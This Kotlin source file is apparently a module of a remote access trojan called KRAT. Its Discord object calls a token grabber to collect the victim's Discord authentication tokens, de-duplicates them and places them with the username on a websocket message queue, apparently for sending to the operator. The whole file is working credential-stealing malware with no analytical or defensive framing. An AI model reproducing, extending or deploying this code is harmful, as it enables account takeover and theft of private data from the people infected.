package services

import KRAT.user
import models.informations.DiscordAccount
import services.discord.TokenGrabber.getTokens
import utils.ListUtils.removeDuplicates
import websocket.messagesQueue

object Discord {
    fun sendTokens() {
        val tokens = getTokens()?.removeDuplicates() ?: return

        messagesQueue.add(
            DiscordAccount(
                username = user,
                tokens = tokens
            )
        )
    }
}